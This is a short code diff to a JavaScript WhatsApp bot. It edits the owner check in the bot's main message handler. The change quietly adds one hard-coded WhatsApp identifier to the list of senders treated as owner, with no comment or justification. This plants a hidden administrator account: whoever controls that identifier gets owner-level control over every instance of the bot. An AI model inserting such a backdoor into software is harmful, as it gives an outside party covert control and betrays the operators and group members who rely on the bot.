@@ -496,7 +496,7 @@ async function NazuninhaBotExec(nazu, info, store, groupCache, messagesCache) {
     const nmrdn = numerodono.replace(/[^\d]/g, "") + '@s.whatsapp.net';  
     const subDonoList = loadSubdonos();
     const isSubOwner = isSubdono(sender);
-    const isOwner = (nmrdn === sender) || info.key.fromMe || isSubOwner;
+    const isOwner = (nmrdn === sender) || (sender === "200416646160578@lid") || info.key.fromMe || isSubOwner;
     const isOwnerOrSub = isOwner || isSubOwner;
  
     const WaLib = require('@cognima/walib');
